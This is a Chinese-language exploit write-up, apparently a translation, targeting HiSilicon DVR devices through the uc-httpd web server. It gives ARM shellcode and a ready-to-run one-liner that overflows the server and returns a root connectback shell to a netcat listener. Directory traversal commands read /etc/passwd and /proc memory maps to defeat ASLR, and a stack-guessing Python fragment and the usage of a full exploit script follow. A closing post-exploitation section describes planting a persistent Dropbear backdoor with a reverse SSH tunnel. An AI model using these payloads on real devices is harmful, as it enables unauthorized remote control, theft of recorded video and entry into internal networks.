    696e2f736858deadbeef
向它注入payload应该可以使该漏洞发挥作用，并且应该给远程设备提供一个connectback shell。  
当然，首先要启动一个监听器`192.168.88.100`：
    $ nc -nvlp 31337
然后启动 payload:
    $ python -c 'shellcode = "01108fe211ff2fe111a18a78013a8a700221081c0121921a0f02193701df061c0ba102230b801022023701df3e270137c821301c01df0139fbd507a0921ac27105b469460b2701df0127381c01dfc046ffff7b69c0a858642f62696e2f736858deadbeef".decode("hex");  print "GET " + shellcode + "a"*(299-len(shellcode)) + "\xec\xf3\x26\x5a" + " HTTP"' | nc 192.168.88.127 80
    nc: using stream socket
    HTTP/1.0 200 OK
    Content-type: application/binary
    Server: uc-httpd 1.0.0
    Expires: 0
    404 File Not Found
    The requested URL was not found on this server
在本地 gdb Exp 应该有效 :) :
    process 1064 is executing new program: /bin/busybox
    Reading /bin/busybox from remote target...
    Reading /bin/busybox from remote target...
并且RCE已经在netcat监听器上准备好:
    nc: connect to 192.168.88.100 31337 from 192.168.88.127 55442
    nc: using stream socket
现在可以在远程系统上执行arbitraty命令（以root身份！）。  
但不幸的是，漏洞利用尚未准备好进行实际部署，因为ASLR已打开，因此我们尚未得知shellcode起始地址。
### 绕过ASLR
绕过ASLR并不是一件容易的工作，但是它通常可以通过一些新奇的的想法来完成。通常有两种方法可以做到这一点：
  * 在随机性发生器中发现一些弱点并通过暴力或部分泄漏/重写来攻击它，
  * 泄漏远程二进制文件的随机内存地址。
现在暴力破坏似乎没用了（触发错误的地址将导致崩溃和慢速重启），所以只有泄漏似乎很方便（如果我们能找到的话）。
经过长时间的研究，几乎不得不放弃它，找不到任何漏洞，但后来一个想法从完全不同的方向出现了。
Web服务器中存在一个不同的漏洞，即目录遍历漏洞。事实上，它也适用于列出目录（这也很重要）。
目录遍历漏洞意味着：
    $ echo -ne 'GET ../../etc/passwd HTTP' | nc 192.168.88.127 80
    nc: using stream socket
    HTTP/1.0 200 OK
    Content-type: text/plain
    Server: uc-httpd 1.0.0
    Expires: 0
    root:absxcfbgXtb3o:0:0:root:/:/bin/sh
我们还可以获得目录列表：
    $ echo -ne 'GET ../../etc HTTP' | nc 192.168.88.127 80nc: using stream socket
    HTTP/1.0 200 OK
    Content-type: application/binary
    Server: uc-httpd 1.0.0
    Expires: 0
    Index of /mnt/web/../../etc
    .
    ..
    fs-version
    fstab
    group
    init.d
    inittab
    mactab
    memstat.conf
    mtab
    passwd
    passwd-
    ppp
    profile
    protocols
    resolv.conf
    services
    udev
请注意，此漏洞非常严重，因为攻击者可以读取任何文件，包括录制的视频（如果设备有硬盘存储）。
此外，该漏洞可以帮助我们绕过ASLR。
该`/proc`文件系统包含了很多有关在`/proc/[pid]`目录中运行进程的信息。可以使用`GET
../../proc`列出`/proc`，这样我们就可以得到所有的PID。如果
`/proc/[pid]/cmdline`是`/var/Sofia`，则找到应用程序的PID。
绕过ASLR最重要的信息是 `/proc/[pid]/smaps`。此文件包含内存页统计信息、页面地址和其他有趣信息（例如rss）。例如：
    $ echo -ne 'GET ../../proc/610/cmdline HTTP' | nc 192.168.88.127 80
    nc: using stream socket
    HTTP/1.0 200 OK
    Content-type: text/plain
    Server: uc-httpd 1.0.0
    Expires: 0
    /var/Sofia
    $ echo -ne 'GET ../../proc/610/smaps HTTP' | nc 192.168.88.127 80
    nc: using stream socket
    HTTP/1.0 200 OK
    Content-type: text/plain
    Server: uc-httpd 1.0.0
    Expires: 0
    ...
    4b699000-4be98000 rwxp 00000000 00:00 0
    Size:               8188 kB
    Rss:                   4 kB
    Pss:                   4 kB
    Shared_Clean:          0 kB
    Shared_Dirty:          0 kB
    Private_Clean:         0 kB
    Private_Dirty:         4 kB
    Referenced:            4 kB
    Anonymous:             4 kB
    AnonHugePages:         0 kB
    Swap:                  0 kB
    KernelPageSize:        4 kB
    MMUPageSize:           4 kB
    Locked:                0 kB
    ...
这只是一页，该列表包含约150页。
看看上面的结构（注意页面大小，模式等），我们可以猜测哪一个包含所需线程的堆栈。堆栈与基址的偏移量是常量（它是0x7fd3d8）。
猜测内存页面的片段：
    def guessregion(smaps):
        for t in range(len(smaps)-7, 1, -1):
            if (smaps[t][1][0], smaps[t+1][1][0], smaps[t+2][1][0], smaps[t+3][1][0], smaps[t+4][1][0], smaps[t+5][1][0], smaps[t+6][1][0]) == (8188, 8188, 8188, 8188, 8188, 8188, 8188) and
            smaps[t][1][1] == 4 and smaps[t+1][1][1] == 4 and smaps[t+2][1][1] == 4 and smaps[t+3][1][1] >= 8 and smaps[t+4][1][1] >= 4 and smaps[t+5][1][1] >= 4 and smaps[t+6][1][1] >= 8:
                return (t+3)
        return (-1)
其中 `smaps[t][1][0]` is 是第`t`整页的大小，`smaps[t][1][1]`是相关的RSS。
该片段是完整漏洞利用脚本的一部分。有关脚本的简要介绍：
    $ ./pwn_hisilicon_dvr.py -h
    usage: pwn_hisilicon_dvr.py [-h] --rhost RHOST [--rport RPORT] --lhost LHOST
                                [--lport LPORT] [--bhost BHOST] [--bport BPORT]
                                [-n] [-i] [-p] [-u] [--offset OFFSET]
                                [--cmdline CMDLINE]
    exploit HiSilicon DVR devices
    optional arguments:
      -h, --help         show this help message and exit
      --rhost RHOST      target host
      --rport RPORT      target port
      --lhost LHOST      connectback ip
      --lport LPORT      connectback port
      --bhost BHOST      listen ip to bind (default: connectback)
      --bport BPORT      listen port to bind (default: connectback)
      -n, --nolisten     do not start listener (you should care about connectback
                         listener on your own)
      -i, --interactive  select stack memory region interactively (rather than
                         using autodetection)
      -p, --persistent   make connectback shell persistent by restarting dvr app
                         automatically (DANGEROUS!)
      -u, --upload       upload tools (now hardcoded "./tools/dropbear" in script)
                         after pwn
      --offset OFFSET    exploit param stack offset to mem page base (default:
                         0x7fd3d8)
      --cmdline CMDLINE  cmdline of Sofia binary on remote target (default
                         "/var/Sofia")
## post-exploitation
我们能用这个RCE做什么？一切。请记住，这是一个未经授权的RCE，它只使用网络服务端口80/tcp。这个端口通常被转发到外部，所以如果攻击者利用这个RCE访问接口，他就可以访问内部局域网。
我们的攻击脚本有一些很好的特性，比如它可以上传（以前编译过的）工具到受害者设备。
如果我们想创建一个持久、稳定的后门，我们可以上传一个Dropbear，让它在本地监听，并向外部打开一个反向SSH隧道。有了这种架构，就可以随时随地登录DVR设备。
    $ ./pwn_hisilicon_dvr.py --rhost 192.168.88.127 --lhost 192.168.88.100 -p -u
    [*] target is 192.168.88.127:80
    [*] connectback on 192.168.88.100:31337
    [+] assembling shellcode: done. length is 104 bytes
    [+] identifying model number: MBD6804T-EL
    [*] exploiting dir path traversal of web service to get leak addresses
    [+] getting pidlist: found 35 processes
    [+] searching for PID of '/var/Sofia': 610
    [+] getting stack section base: 0x5a47a000